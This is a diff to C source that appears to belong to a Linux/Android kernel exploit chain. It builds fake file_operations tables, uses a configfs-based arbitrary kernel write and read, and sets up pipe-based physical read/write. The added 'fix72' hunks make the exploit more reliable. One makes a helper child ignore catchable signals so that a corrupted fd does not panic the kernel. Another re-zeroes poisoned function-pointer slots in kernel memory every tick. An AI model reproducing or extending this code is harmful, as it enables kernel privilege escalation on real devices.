@@ -913,6 +913,38 @@ uintptr_t prepare_pipe_buffer_page(void) {
     ks_child_no_atexit = 1;
     prctl(PR_SET_NAME, "pipe_prepare", 0, 0, 0);
     prctl(PR_SET_PDEATHSIG, SIGKILL);
+    /* fix72 (redo15): this child had NO signal disposition at all.  Any
+     * catchable fatal signal (SIGHUP from session/adb teardown, SIGTERM,
+     * SIGALRM, ...) runs get_signal -> do_group_exit -> exit_files onto
+     * the inherited fake-fops fds -> filp_close reads the poisoned flush
+     * slot (redo15 pstore: pc=0x12, x21=0x1000000000000012, lr=
+     * filp_close+0x54, NO "Fatal signal" line = not SIGSEGV, no lmk/OOM
+     * record, kill()-site code audit found no sender).  Block + ignore
+     * the whole catchable family; the unblockable SIGKILL class
+     * (PDEATHSIG, reset_pipe_attempt, external) is handled by the
+     * periodic flush sanitize in the window loop instead. */
+    {
+      sigset_t blk;
+      sigemptyset(&blk);
+      sigaddset(&blk, SIGTERM);
+      sigaddset(&blk, SIGHUP);
+      sigaddset(&blk, SIGINT);
+      sigaddset(&blk, SIGQUIT);
+      sigaddset(&blk, SIGALRM);
+      sigaddset(&blk, SIGPIPE);
+      sigaddset(&blk, SIGUSR1);
+      sigaddset(&blk, SIGUSR2);
+      sigaddset(&blk, SIGTRAP);
+      sigprocmask(SIG_BLOCK, &blk, NULL);
+      signal(SIGTERM, SIG_IGN);
+      signal(SIGHUP, SIG_IGN);
+      signal(SIGINT, SIG_IGN);
+      signal(SIGQUIT, SIG_IGN);
+      signal(SIGALRM, SIG_IGN);
+      signal(SIGPIPE, SIG_IGN);
+      signal(SIGUSR1, SIG_IGN);
+      signal(SIGUSR2, SIG_IGN);
+    }
     SYSCHK(close(result_pipe[0]));
     uintptr_t base = prepare_pipe_buffer_page_child();
     SYSCHK(write(result_pipe[1], &base, sizeof(base)));
@@ -1531,6 +1563,36 @@ int install_pipe_physrw(int fd) {
         ioctl(reclaim_recv_fd(), SIOCINQ, &q);
         pr_info("win tick +%lds skbrxq=%d base_events=%d dead=%d\n", elapsed,
                 q, ks_watch_frees_events(), tbl_dead_logged);
+        /* fix72 (redo15): the flush/release slots get poisoned (0x12) in
+         * the seconds after route put with NO chain-side writer in the
+         * log (redo10 could not name the writer either), and any SIGKILL
+         * landing while the child holds the fake fd then panics in
+         * filp_close.  Re-zero both slots every tick so the poison
+         * window an unblockable kill can hit shrinks from unbounded to
+         * <1s; also read back the flush slot so a recurring poison
+         * value is observable in the chain log. */
+        if (g_fops_probe_fd >= 0) {
+          uint64_t z = 0;
+          ssize_t sw = configfs_write_once(
+              g_fops_probe_fd, fops_table_base() + FOPS_FLUSH_OFF, &z, 8);
+          ssize_t sw2 = configfs_write_once(
+              g_fops_probe_fd, fops_table_base() + FOPS_RELEASE_OFF, &z, 8);
+          static int fix72_warned = 0;
+          if (sw != 8 || sw2 != 8) {
+            if (!fix72_warned) {
+              pr_warning("fix72: periodic flush sanitize failed sw=%zd "
+                         "sw2=%zd (log suppressed)\n", sw, sw2);
+              fix72_warned = 1;
+            }
+          } else {
+            uint64_t back = 0xdead;
+            if (ks_fetch64(fops_table_base() + FOPS_FLUSH_OFF, &back) == 8 &&
+                back != 0) {
+              pr_warning("fix72: flush slot poisoned again value=%llx "
+                         "at +%lds\n", (unsigned long long)back, elapsed);
+            }
+          }
+        }
       }
       if (pipe_prepare_child > 0) {
         int st = 0;
